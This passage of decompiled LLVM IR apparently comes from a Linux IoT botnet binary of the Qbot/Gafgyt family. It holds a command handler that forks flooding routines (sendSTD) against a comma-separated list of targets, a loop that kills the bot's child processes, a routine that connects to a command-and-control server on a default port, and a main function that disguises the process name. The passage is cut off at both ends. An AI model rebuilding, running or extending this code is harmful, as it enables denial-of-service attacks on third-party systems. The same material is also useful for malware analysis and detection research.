  %v3_10364 = inttoptr i32 %v2_10358 to i8*
  %v4_10364 = call i32 @__GI_strcoll(i8* %v3_10364, i32 ptrtoint ([4 x i8]* @global_var_22b88.917 to i32))
  %v2_1036c = icmp eq i32 %v4_10364, 0
  br i1 %v2_1036c, label %dec_label_pc_10374, label %dec_label_pc_10590

dec_label_pc_10374:                               ; preds = %dec_label_pc_10354
  %v7_1037c = icmp slt i32 %arg1, 4
  br i1 %v7_1037c, label %dec_label_pc_103c0, label %dec_label_pc_10380

dec_label_pc_10380:                               ; preds = %dec_label_pc_10374
  %v1_10384 = add i32 %tmp, 8
  %v1_10388 = inttoptr i32 %v1_10384 to i32*
  %v2_10388 = load i32, i32* %v1_10388, align 4
  store i32 %v2_10388, i32* @r0, align 4
  %v1_10390 = call i32 @atol(i32 %v2_10388)
  %tmp107 = icmp slt i32 %v1_10390, 1
  br i1 %tmp107, label %dec_label_pc_103c0, label %dec_label_pc_103a0

dec_label_pc_103a0:                               ; preds = %dec_label_pc_10380
  %v1_103a4 = add i32 %tmp, 12
  %v1_103a8 = inttoptr i32 %v1_103a4 to i32*
  %v2_103a8 = load i32, i32* %v1_103a8, align 4
  store i32 %v2_103a8, i32* @r0, align 4
  %v1_103b0 = call i32 @atol(i32 %v2_103a8)
  %v5_103bc = icmp sgt i32 %v1_103b0, 0
  br i1 %v5_103bc, label %dec_label_pc_103d8, label %dec_label_pc_103c0

dec_label_pc_103c0:                               ; preds = %dec_label_pc_103a0, %dec_label_pc_10380, %dec_label_pc_10374
  %v2_103c4 = load i32, i32* @global_var_2c908.54, align 4
  %v3_103d0 = call i32 @sockprintf(i32 %v2_103c4, i32 ptrtoint ([27 x i8]* @global_var_22b8c.919 to i32))
  br label %dec_label_pc_1070c

dec_label_pc_103d8:                               ; preds = %dec_label_pc_103a0
  %v1_103dc = add i32 %tmp, 4
  %v1_103e0 = inttoptr i32 %v1_103dc to i32*
  %v2_103e0 = load i32, i32* %v1_103e0, align 4
  %v2_103f0 = load i32, i32* %v1_10388, align 4
  store i32 %v2_103f0, i32* @r0, align 4
  %v1_103f8 = call i32 @atol(i32 %v2_103f0)
  %v2_1040c = load i32, i32* %v1_103a8, align 4
  store i32 %v2_1040c, i32* @r0, align 4
  %v1_10414 = call i32 @atol(i32 %v2_1040c)
  %v2_1042c = call i32 @__GI_strchr(i32 %v2_103e0, i32 44)
  %v2_10434 = icmp eq i32 %v2_1042c, 0
  br i1 %v2_10434, label %dec_label_pc_10568, label %dec_label_pc_1043c

dec_label_pc_1043c:                               ; preds = %dec_label_pc_103d8
  store i32 %v2_103e0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1b05c.404 to i32), i32* @r1, align 4
  %v2_10448 = call i32 @__GI_strtok(i32 %v2_103e0, i32 ptrtoint (i32* @global_var_1b05c.404 to i32))
  %v2_1055c30 = icmp eq i32 %v2_10448, 0
  br i1 %v2_1055c30, label %dec_label_pc_10590, label %dec_label_pc_1051c

dec_label_pc_1051c:                               ; preds = %dec_label_pc_1043c, %dec_label_pc_10544
  %storemerge1331 = phi i32 [ %v2_1054c, %dec_label_pc_10544 ], [ %v2_10448, %dec_label_pc_1043c ]
  %v0_1051c = call i32 @listFork()
  %v2_10524 = icmp eq i32 %v0_1051c, 0
  br i1 %v2_10524, label %dec_label_pc_1052c, label %dec_label_pc_10544

dec_label_pc_1052c:                               ; preds = %dec_label_pc_1051c
  %v4_10538 = call i32 @sendSTD(i32 %storemerge1331, i32 %v1_103f8, i32 %v1_10414, i32 0)
  %v1_10540 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_10544:                               ; preds = %dec_label_pc_1051c
  store i32 0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1b05c.404 to i32), i32* @r1, align 4
  %v2_1054c = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1b05c.404 to i32))
  %v2_1055c = icmp eq i32 %v2_1054c, 0
  br i1 %v2_1055c, label %dec_label_pc_10590, label %dec_label_pc_1051c

dec_label_pc_10568:                               ; preds = %dec_label_pc_103d8
  %v0_10568 = call i32 @listFork()
  %v2_10570 = icmp eq i32 %v0_10568, 0
  br i1 %v2_10570, label %dec_label_pc_10578, label %dec_label_pc_1070c

dec_label_pc_10578:                               ; preds = %dec_label_pc_10568
  %v4_10584 = call i32 @sendSTD(i32 %v2_103e0, i32 %v1_103f8, i32 %v1_10414, i32 0)
  %v1_1058c = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_10590:                               ; preds = %dec_label_pc_10544, %dec_label_pc_1043c, %dec_label_pc_10354
  %v2_10594 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_22ba8.921 to i32), i32* @r1, align 4
  %v3_105a0 = inttoptr i32 %v2_10594 to i8*
  %v4_105a0 = call i32 @__GI_strcoll(i8* %v3_105a0, i32 ptrtoint ([9 x i8]* @global_var_22ba8.921 to i32))
  %v2_105a8 = icmp eq i32 %v4_105a0, 0
  br i1 %v2_105a8, label %dec_label_pc_105b0, label %dec_label_pc_106e4

dec_label_pc_105b0:                               ; preds = %dec_label_pc_10590
  br label %dec_label_pc_10654

dec_label_pc_105c4:                               ; preds = %dec_label_pc_10654, %dec_label_pc_10688
  %v3_105c8 = mul i32 %storemerge11, 4
  %v2_105d4 = load i32, i32* @global_var_32b90.75, align 4
  %v2_105d8 = add i32 %v2_105d4, %v3_105c8
  %v1_105dc = inttoptr i32 %v2_105d8 to i32*
  %v2_105dc = load i32, i32* %v1_105dc, align 4
  %v2_105e0 = icmp eq i32 %v2_105dc, 0
  br i1 %v2_105e0, label %dec_label_pc_10648, label %dec_label_pc_105e8

dec_label_pc_105e8:                               ; preds = %dec_label_pc_105c4
  %v2_10600 = load i32, i32* %v1_105dc, align 4
  store i32 %v2_10600, i32* @r4, align 4
  %v0_10604 = call i32 @__libc_getpid()
  %v0_1060c = load i32, i32* @r4, align 4
  %v9_1060c = icmp eq i32 %v0_1060c, %v0_10604
  br i1 %v9_1060c, label %dec_label_pc_10648, label %dec_label_pc_10614

dec_label_pc_10614:                               ; preds = %dec_label_pc_105e8
  %v0_10638 = call i32 @kill()
  %v1_10640 = add i32 %stack_var_-44.1, 1
  br label %dec_label_pc_10648

dec_label_pc_10648:                               ; preds = %dec_label_pc_105e8, %dec_label_pc_105c4, %dec_label_pc_10614
  %stack_var_-44.0 = phi i32 [ %stack_var_-44.1, %dec_label_pc_105c4 ], [ %stack_var_-44.1, %dec_label_pc_105e8 ], [ %v1_10640, %dec_label_pc_10614 ]
  %v1_1064c = add i32 %storemerge11, 1
  br label %dec_label_pc_10654

dec_label_pc_10654:                               ; preds = %dec_label_pc_105b0, %dec_label_pc_10648
  %stack_var_-44.1 = phi i32 [ 0, %dec_label_pc_105b0 ], [ %stack_var_-44.0, %dec_label_pc_10648 ]
  %storemerge11 = phi i32 [ 0, %dec_label_pc_105b0 ], [ %v1_1064c, %dec_label_pc_10648 ]
  %v5_1066c = load i32, i32* @global_var_2c914.73, align 4
  %v9_10680 = icmp eq i32 %v5_1066c, 0
  br i1 %v9_10680, label %dec_label_pc_10688, label %dec_label_pc_105c4

dec_label_pc_10688:                               ; preds = %dec_label_pc_10654
  %v2_1066c = load i32, i32* @global_var_2c910.72, align 4
  store i32 0, i32* @r2, align 4
  %tmp117 = icmp ugt i32 %v2_1066c, %storemerge11
  br i1 %tmp117, label %dec_label_pc_105c4, label %dec_label_pc_106a8

dec_label_pc_106a8:                               ; preds = %dec_label_pc_10688
  %tmp108 = icmp slt i32 %stack_var_-44.1, 1
  %v2_106d4 = load i32, i32* @global_var_2c908.54, align 4
  br i1 %tmp108, label %dec_label_pc_106d0, label %dec_label_pc_106b4

dec_label_pc_106b4:                               ; preds = %dec_label_pc_106a8
  store i32 %stack_var_-44.1, i32* @r2, align 4
  %v3_106c8 = call i32 @sockprintf(i32 %v2_106d4, i32 ptrtoint ([11 x i8]* @global_var_22bb4.926 to i32))
  br label %dec_label_pc_106e4

dec_label_pc_106d0:                               ; preds = %dec_label_pc_106a8
  %v3_106e0 = call i32 @sockprintf(i32 %v2_106d4, i32 ptrtoint ([13 x i8]* @global_var_22bc0.928 to i32))
  br label %dec_label_pc_106e4

dec_label_pc_106e4:                               ; preds = %dec_label_pc_10590, %dec_label_pc_106b4, %dec_label_pc_106d0
  %v2_106e8 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([10 x i8]* @global_var_22bd0.930 to i32), i32* @r1, align 4
  %v3_106f4 = inttoptr i32 %v2_106e8 to i8*
  %v4_106f4 = call i32 @__GI_strcoll(i8* %v3_106f4, i32 ptrtoint ([10 x i8]* @global_var_22bd0.930 to i32))
  %v2_106fc = icmp eq i32 %v4_106f4, 0
  br i1 %v2_106fc, label %dec_label_pc_10704, label %dec_label_pc_1070c

dec_label_pc_10704:                               ; preds = %dec_label_pc_106e4
  %v1_10708 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_1070c

dec_label_pc_1070c:                               ; preds = %dec_label_pc_fc70, %dec_label_pc_fc08, %dec_label_pc_10114, %dec_label_pc_1032c, %dec_label_pc_10568, %dec_label_pc_106e4, %dec_label_pc_fc94, %dec_label_pc_f838, %dec_label_pc_f6e8, %dec_label_pc_ffe4, %dec_label_pc_f7bc, %dec_label_pc_f680, %dec_label_pc_103c0, %dec_label_pc_10238, %dec_label_pc_fde4, %dec_label_pc_faa0, %dec_label_pc_f934, %dec_label_pc_f860, %dec_label_pc_f720, %dec_label_pc_f61c, %dec_label_pc_f5d8, %dec_label_pc_f5a0, %dec_label_pc_10704
  %v24_10710 = phi i32 [ %v0_10114, %dec_label_pc_10114 ], [ %v0_1032c, %dec_label_pc_1032c ], [ %v0_10568, %dec_label_pc_10568 ], [ %v4_106f4, %dec_label_pc_106e4 ], [ %v0_fc94, %dec_label_pc_fc94 ], [ 0, %dec_label_pc_f838 ], [ 0, %dec_label_pc_f6e8 ], [ 0, %dec_label_pc_ffe4 ], [ 0, %dec_label_pc_f7bc ], [ 0, %dec_label_pc_f680 ], [ %v3_103d0, %dec_label_pc_103c0 ], [ %v3_10248, %dec_label_pc_10238 ], [ %v3_fdf4, %dec_label_pc_fde4 ], [ %v3_fab0, %dec_label_pc_faa0 ], [ %v3_f958, %dec_label_pc_f934 ], [ %v0_f848, %dec_label_pc_f860 ], [ %v0_f6f8, %dec_label_pc_f720 ], [ %v1_f634, %dec_label_pc_f61c ], [ %v3_f5f4, %dec_label_pc_f5d8 ], [ %v3_f5b0, %dec_label_pc_f5a0 ], [ %v1_10708, %dec_label_pc_10704 ], [ 0, %dec_label_pc_fc08 ], [ 0, %dec_label_pc_fc70 ]
  store i32 %v3_f43c, i32* @r4, align 4
  store i32 %v6_f43c, i32* @r5, align 4
  store i32 %v9_f43c, i32* @r6, align 4
  store i32 %v12_f43c, i32* @r7, align 4
  store i32 %v15_f43c, i32* @r8, align 4
  store i32 %v18_f43c, i32* @fp, align 4
  ret i32 %v24_10710

; uselistorder directives
  uselistorder i32 %v2_106d4, { 1, 0 }
  uselistorder i32 %stack_var_-44.1, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v2_1054c, { 1, 0 }
  uselistorder i32 %v1_10414, { 1, 0 }
  uselistorder i32 %v1_103f8, { 1, 0 }
  uselistorder i32 %v2_103e0, { 2, 1, 0, 3 }
  uselistorder i32 %v2_10310, { 1, 0 }
  uselistorder i32 %v1_1028c, { 1, 0 }
  uselistorder i32 %v1_10270, { 1, 0 }
  uselistorder i32 %v2_10258, { 2, 1, 0, 3 }
  uselistorder i32* %v1_fff8, { 2, 0, 1, 3 }
  uselistorder i32 %v2_ff64, { 1, 0 }
  uselistorder i32 %storemerge6, { 1, 0 }
  uselistorder i32 %storemerge7, { 1, 0 }
  uselistorder i32 %v1_fe54, { 1, 0 }
  uselistorder i32 %v1_fe38, { 1, 0 }
  uselistorder i32 %v1_fe1c, { 1, 0 }
  uselistorder i32 %v2_fe04, { 2, 1, 0, 3 }
  uselistorder i32 %v2_fc78, { 1, 0 }
  uselistorder i32 %storemerge8, { 1, 0 }
  uselistorder i32 %storemerge9, { 1, 0 }
  uselistorder i32 %storemerge10, { 1, 0 }
  uselistorder i32 %v1_fb10, { 1, 0 }
  uselistorder i32 %v1_faf4, { 1, 0 }
  uselistorder i32 %v1_fad8, { 1, 0 }
  uselistorder i32 %v2_fac0, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %tmp, { 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 2, 3, 4, 5, 6, 18, 1, 19, 20, 21, 22, 0, 23, 24, 25, 28, 27, 26, 29, 30, 31, 32, 33, 34, 35, 36, 37 }
  uselistorder i32 (i32, i32, i32, i32)* @sendSTD, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @sendCNC, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @sendTCP, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @sendUDP, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1b05c.404 to i32), { 3, 12, 4, 13, 2, 14, 5, 15, 1, 16, 6, 17, 0, 18, 7, 19, 8, 20, 9, 21, 10, 22, 11, 23 }
  uselistorder i32 1000, { 3, 2, 1, 0 }
  uselistorder i32 ptrtoint ([3 x i8]* @global_var_22988.883 to i32), { 0, 2, 1, 3 }
  uselistorder i32* @global_var_32b8c.879, { 0, 4, 1, 5, 2, 6, 3, 7 }
  uselistorder i32 ()* @getdtablesize, { 1, 0 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_1a708.56 to i32), { 0, 2, 1 }
  uselistorder i32 ptrtoint ([4 x i8]* @global_var_228b4.856 to i32), { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 ptrtoint ([7 x i8]* @global_var_22864.850 to i32), { 0, 2, 1, 3 }
  uselistorder i32 (i32)* @ClearHistory, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @__libc_system, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1070c, { 22, 5, 4, 12, 3, 13, 2, 9, 14, 6, 0, 1, 15, 16, 17, 7, 10, 18, 8, 11, 19, 20, 21 }
  uselistorder label %dec_label_pc_106e4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10654, { 1, 0 }
  uselistorder label %dec_label_pc_10648, { 2, 0, 1 }
  uselistorder label %dec_label_pc_105c4, { 1, 0 }
  uselistorder label %dec_label_pc_1051c, { 1, 0 }
  uselistorder label %dec_label_pc_102d0, { 1, 0 }
  uselistorder label %dec_label_pc_10038, { 1, 0 }
  uselistorder label %dec_label_pc_ffc4, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_ff18, { 1, 0 }
  uselistorder label %dec_label_pc_fed8, { 1, 0 }
  uselistorder label %dec_label_pc_fea0, { 1, 0 }
  uselistorder label %dec_label_pc_fdfc, { 1, 0 }
  uselistorder label %dec_label_pc_fc24, { 1, 0 }
  uselistorder label %dec_label_pc_fbe4, { 1, 0 }
  uselistorder label %dec_label_pc_fbac, { 1, 0 }
  uselistorder label %dec_label_pc_fb68, { 1, 0 }
  uselistorder label %dec_label_pc_fab8, { 1, 0 }
  uselistorder label %dec_label_pc_f814, { 1, 0 }
  uselistorder label %dec_label_pc_f6c4, { 1, 0 }
  uselistorder label %dec_label_pc_f580, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f53c, { 1, 0 }
  uselistorder label %dec_label_pc_f4f8, { 1, 0 }
  uselistorder label %dec_label_pc_f4b4, { 1, 0 }
}

define i32 @initConnection() local_unnamed_addr {
entry:
  %stack_var_-4116 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_10718 = load i32, i32* @fp, align 4
  store i32 67360, i32* %stack_var_-4, align 4
  %v2_1071c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_1071c, i32* @fp, align 4
  %v2_10730 = ptrtoint i32* %stack_var_-4116 to i32
  store i32 4096, i32* @r2, align 4
  %v2_10740 = bitcast i32* %stack_var_-4116 to i8*
  %v3_10740 = call i32 @__GI_memset(i8* %v2_10740, i32 0)
  %v2_10748 = load i32, i32* @global_var_2c908.54, align 4
  %v2_1074c = icmp eq i32 %v2_10748, 0
  br i1 %v2_1074c, label %dec_label_pc_10770, label %dec_label_pc_10754

dec_label_pc_10754:                               ; preds = %entry
  %v1_10760 = call i32 @__libc_close(i32 %v2_10748)
  store i32 0, i32* @global_var_2c908.54, align 4
  br label %dec_label_pc_10770

dec_label_pc_10770:                               ; preds = %entry, %dec_label_pc_10754
  %v2_10774 = load i32, i32* @global_var_2c484.933, align 4
  %v2_10778 = icmp eq i32 %v2_10774, 0
  br i1 %v2_10778, label %dec_label_pc_107a4, label %dec_label_pc_10790

dec_label_pc_10790:                               ; preds = %dec_label_pc_10770
  %v1_10798 = add i32 %v2_10774, 1
  br label %dec_label_pc_107a4

dec_label_pc_107a4:                               ; preds = %dec_label_pc_10770, %dec_label_pc_10790
  %storemerge1 = phi i32 [ %v1_10798, %dec_label_pc_10790 ], [ 0, %dec_label_pc_10770 ]
  store i32 %storemerge1, i32* @global_var_2c484.933, align 4
  %v4_107bc = mul i32 %storemerge1, 4
  %v5_107bc = add i32 %v4_107bc, ptrtoint ([18 x i8]** @global_var_2c480.935 to i32)
  %v6_107bc = inttoptr i32 %v5_107bc to i32*
  %v7_107bc = load i32, i32* %v6_107bc, align 4
  %v2_107c8 = inttoptr i32 %v7_107bc to i8*
  %v3_107c8 = call i32 @strcpy(i32 %v2_10730, i8* %v2_107c8)
  %v2_107ec = call i32 @__GI_strchr(i32 %v2_10730, i32 58)
  %v2_107f4 = icmp eq i32 %v2_107ec, 0
  br i1 %v2_107f4, label %dec_label_pc_10854, label %dec_label_pc_107fc

dec_label_pc_107fc:                               ; preds = %dec_label_pc_107a4
  %v2_10810 = call i32 @__GI_strchr(i32 %v2_10730, i32 58)
  %v1_10818 = add i32 %v2_10810, 1
  store i32 %v1_10818, i32* @r0, align 4
  %v1_10820 = call i32 @atol(i32 %v1_10818)
  %v2_10840 = call i32 @__GI_strchr(i32 %v2_10730, i32 58)
  %v3_10850 = inttoptr i32 %v2_10840 to i8*
  store i8 0, i8* %v3_10850, align 1
  br label %dec_label_pc_10854

dec_label_pc_10854:                               ; preds = %dec_label_pc_107a4, %dec_label_pc_107fc
  %stack_var_-20.0 = phi i32 [ 666, %dec_label_pc_107a4 ], [ %v1_10820, %dec_label_pc_107fc ]
  %v0_10860 = call i32 @socket()
  store i32 %v0_10860, i32* @global_var_2c908.54, align 4
  %v4_10894 = call i32 @connectTimeout(i32 %v0_10860, i32 %v2_10730, i32 %stack_var_-20.0, i32 30)
  %v2_1089c = icmp eq i32 %v4_10894, 0
  %. = zext i1 %v2_1089c to i32
  store i32 %v3_10718, i32* @fp, align 4
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v2_10730, { 2, 0, 1, 3, 4 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 (i32)* @atol, { 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10854, { 1, 0 }
  uselistorder label %dec_label_pc_107a4, { 1, 0 }
  uselistorder label %dec_label_pc_10770, { 1, 0 }
}

define i32 @getOurIP() local_unnamed_addr {
entry:
  %stack_var_-4182 = alloca i32, align 4
  %stack_var_-4200 = alloca i32, align 4
  %stack_var_-4168 = alloca i8, align 1
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-4208 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_108e4 = load i32, i32* @fp, align 4
  store i32 %v3_108e4, i32* %stack_var_-16, align 4
  %v0_10900 = call i32 @socket()
  %v3_10910 = icmp eq i32 %v0_10900, -1
  br i1 %v3_10910, label %dec_label_pc_10918, label %dec_label_pc_10928

dec_label_pc_10918:                               ; preds = %entry
  br label %dec_label_pc_10b90

dec_label_pc_10928:                               ; preds = %entry
  store i32 2, i32* %stack_var_-52, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_22bdc.937 to i32), i32* @r0, align 4
  %v2_1096c = call i32 @inet_addr(i32 ptrtoint ([8 x i8]* @global_var_22bdc.937 to i32))
  %v1_1097c = call i32 @htons(i32 53)
  %v3_109a0 = bitcast i32* %stack_var_-52 to %sockaddr*
  %v4_109a0 = call i32 @__libc_connect(i32 %v0_10900, %sockaddr* %v3_109a0, i32 16)
  %v3_109b0 = icmp eq i32 %v4_109a0, -1
  br i1 %v3_109b0, label %dec_label_pc_109b8, label %dec_label_pc_109c8

dec_label_pc_109b8:                               ; preds = %dec_label_pc_10928
  br label %dec_label_pc_10b90

dec_label_pc_109c8:                               ; preds = %dec_label_pc_10928
  store i32 16, i32* %stack_var_-72, align 4
  %v2_109d0 = ptrtoint i32* %stack_var_-68 to i32
  %v2_109d4 = ptrtoint i32* %stack_var_-72 to i32
  %v5_109e0 = bitcast i32* %stack_var_-68 to %sockaddr*
  %v6_109e0 = call i32 @__GI_getsockname(i32 %v0_10900, %sockaddr* %v5_109e0, i32 %v2_109d4, i32 %v2_109d0, i32 16)
  %v3_109f0 = icmp eq i32 %v6_109e0, -1
  br i1 %v3_109f0, label %dec_label_pc_109f8, label %dec_label_pc_10a08

dec_label_pc_109f8:                               ; preds = %dec_label_pc_109c8
  br label %dec_label_pc_10b90

dec_label_pc_10a08:                               ; preds = %dec_label_pc_109c8
  store i32 ptrtoint (i32* @global_var_32b84.316 to i32), i32* @r2, align 4
  %v4_10a1c = call i32 @__libc_open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_22be4.940, i32 0, i32 0), i32 0)
  %v2_10ab4 = ptrtoint i8* %stack_var_-4168 to i32
  br label %dec_label_pc_10aac

dec_label_pc_10a2c:                               ; preds = %dec_label_pc_10aac
  %v4_10a40 = call i32 @strstr(i32 %v2_10ab4, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_22bf4.942, i32 0, i32 0))
  %v2_10a48 = icmp eq i32 %v4_10a40, 0
  br i1 %v2_10a48, label %dec_label_pc_10a90, label %dec_label_pc_10a70.preheader

dec_label_pc_10a70.preheader:                     ; preds = %dec_label_pc_10a2c
  %v2_10a749 = load i8, i8* %stack_var_-4168, align 1
  %v7_10a7813 = icmp eq i8 %v2_10a749, 9
  br i1 %v7_10a7813, label %dec_label_pc_10a80, label %dec_label_pc_10a64

dec_label_pc_10a64:                               ; preds = %dec_label_pc_10a70.preheader, %dec_label_pc_10a64
  %v4_10a7014 = phi i32 [ %v1_10a68, %dec_label_pc_10a64 ], [ %v2_10ab4, %dec_label_pc_10a70.preheader ]
  %v1_10a68 = add i32 %v4_10a7014, 1
  %v5_10a6c = inttoptr i32 %v1_10a68 to i8*
  %v2_10a74 = load i8, i8* %v5_10a6c, align 1
  %v7_10a78 = icmp eq i8 %v2_10a74, 9
  br i1 %v7_10a78, label %dec_label_pc_10a80, label %dec_label_pc_10a64

dec_label_pc_10a80:                               ; preds = %dec_label_pc_10a64, %dec_label_pc_10a70.preheader
  %storemerge3.lcssa = phi i8* [ %stack_var_-4168, %dec_label_pc_10a70.preheader ], [ %v5_10a6c, %dec_label_pc_10a64 ]
  store i8 0, i8* %storemerge3.lcssa, align 1
  br label %dec_label_pc_10ad4

dec_label_pc_10a90:                               ; preds = %dec_label_pc_10a2c
  store i32 4096, i32* @r2, align 4
  %v3_10aa8 = call i32 @__GI_memset(i8* nonnull %stack_var_-4168, i32 0)
  br label %dec_label_pc_10aac

dec_label_pc_10aac:                               ; preds = %dec_label_pc_10a08, %dec_label_pc_10a90
  %v4_10ac4 = call i32 @fdgets(i32 %v2_10ab4, i32 4096, i32 %v4_10a1c, i32 %v2_10ab4)
  %v2_10acc = icmp eq i32 %v4_10ac4, 0
  br i1 %v2_10acc, label %dec_label_pc_10ad4, label %dec_label_pc_10a2c

dec_label_pc_10ad4:                               ; preds = %dec_label_pc_10aac, %dec_label_pc_10a80
  %v1_10ad8 = call i32 @__libc_close(i32 %v4_10a1c)
  %v4_10ae8 = load i8, i8* %stack_var_-4168, align 1
  %v2_10aec = icmp eq i8 %v4_10ae8, 0
  br i1 %v2_10aec, label %dec_label_pc_10b84, label %dec_label_pc_10af4

dec_label_pc_10af4:                               ; preds = %dec_label_pc_10ad4
  %v2_10afc = ptrtoint i32* %stack_var_-4200 to i32
  %v3_10b14 = call i32 @strcpy(i32 %v2_10afc, i8* nonnull %stack_var_-4168)
  %v3_10b34 = call i32 @ioctl(i32 %v0_10900, i32 35111, i32 %v2_10afc)
  %v2_10b54 = ptrtoint i32* %stack_var_-4182 to i32
  br label %dec_label_pc_10b44

dec_label_pc_10b44:                               ; preds = %dec_label_pc_10af4, %dec_label_pc_10b44
  %storemerge47 = phi i32 [ 0, %dec_label_pc_10af4 ], [ %v1_10b70, %dec_label_pc_10b44 ]
  %v2_10b5c = add i32 %storemerge47, %v2_10b54
  %v1_10b60 = inttoptr i32 %v2_10b5c to i8*
  %v2_10b60 = load i8, i8* %v1_10b60, align 1
  %v4_10b68 = add i32 %storemerge47, ptrtoint (i32* @global_var_2c918.944 to i32)
  %v5_10b68 = inttoptr i32 %v4_10b68 to i8*
  store i8 %v2_10b60, i8* %v5_10b68, align 1
  %v1_10b70 = add nuw nsw i32 %storemerge47, 1
  %v7_10b80 = icmp slt i32 %v1_10b70, 6
  br i1 %v7_10b80, label %dec_label_pc_10b44, label %dec_label_pc_10b84

dec_label_pc_10b84:                               ; preds = %dec_label_pc_10b44, %dec_label_pc_10ad4
  %v1_10b88 = call i32 @__libc_close(i32 %v0_10900)
  %v3_10ba4.pre = load i32, i32* %stack_var_-4208, align 4
  br label %dec_label_pc_10ba0

dec_label_pc_10b90:                               ; preds = %dec_label_pc_109f8, %dec_label_pc_109b8, %dec_label_pc_10918
  store i32 0, i32* %stack_var_-4208, align 4
  br label %dec_label_pc_10ba0

dec_label_pc_10ba0:                               ; preds = %dec_label_pc_10b84, %dec_label_pc_10b90
  %v3_10ba4 = phi i32 [ %v3_10ba4.pre, %dec_label_pc_10b84 ], [ 0, %dec_label_pc_10b90 ]
  %v2_10bac = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_10bac, i32* @fp, align 4
  ret i32 %v3_10ba4

; uselistorder directives
  uselistorder i32 %storemerge47, { 2, 1, 0 }
  uselistorder i32 %v1_10a68, { 1, 0 }
  uselistorder i32 %v2_10ab4, { 1, 3, 0, 2 }
  uselistorder i32 %v0_10900, { 1, 0, 2, 3, 4 }
  uselistorder i32* %stack_var_-4208, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder i8* %stack_var_-4168, { 3, 5, 2, 0, 1, 4 }
  uselistorder i32 (i32)* @htons, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 1, 4, 3, 2, 0 }
  uselistorder i32 53, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10ba0, { 1, 0 }
  uselistorder label %dec_label_pc_10b44, { 1, 0 }
  uselistorder label %dec_label_pc_10aac, { 1, 0 }
  uselistorder label %dec_label_pc_10a64, { 1, 0 }
}

define i32 @getBuild() local_unnamed_addr {
entry:
  ret i32 ptrtoint ([7 x i8]* @global_var_22c00.946 to i32)
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %stack_var_-5744 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-1648 = alloca i32, align 4
  %stack_var_-624 = alloca i32, align 4
  %stack_var_-368 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_10be4 = load i32, i32* @r4, align 4
  store i32 %v3_10be4, i32* %stack_var_-24, align 4
  store i32 68588, i32* %stack_var_-4, align 4
  %v19_10be4 = ptrtoint i32* %stack_var_-24 to i32
  %v2_10be8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_10be8, i32* @fp, align 4
  %v1_10c2c = bitcast i8** %argv to i32*
  %v2_10c2c = load i32, i32* %v1_10c2c, align 4
  store i32 %v2_10c2c, i32* @r4, align 4
  %v2_10c44 = load i32, i32* %v1_10c2c, align 4
  %v1_10c48 = inttoptr i32 %v2_10c44 to i8*
  %v3_10c4c = call i32 @strlen(i8* %v1_10c48)
  %v0_10c54 = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_22c08.948 to i32), i32* @r1, align 4
  %v3_10c60 = call i32 @strncpy(i32 %v0_10c54, i32 ptrtoint (i32* @global_var_22c08.948 to i32), i32 %v3_10c4c)
  store i32 ptrtoint (i32* @global_var_22c08.948 to i32), i32* %v1_10c2c, align 4
  %v0_10c9c = call i32 @prctl()
  %v2_10ca4 = call i32 @__GI_time(i32* null)
  store i32 %v2_10ca4, i32* @r4, align 4
  %v0_10cac = call i32 @__libc_getpid()
  %v0_10cb4 = load i32, i32* @r4, align 4
  %v2_10cb4 = xor i32 %v0_10cb4, %v0_10cac
  %v1_10cbc = call i32 @srand(i32 %v2_10cb4)
  %v2_10cc4 = call i32 @__GI_time(i32* null)
  store i32 %v2_10cc4, i32* @r4, align 4
  %v0_10ccc = call i32 @__libc_getpid()
  %v0_10cd4 = load i32, i32* @r4, align 4
  %v2_10cd4 = xor i32 %v0_10cd4, %v0_10ccc
  %v1_10cdc = call i32 @init_rand(i32 %v2_10cd4)
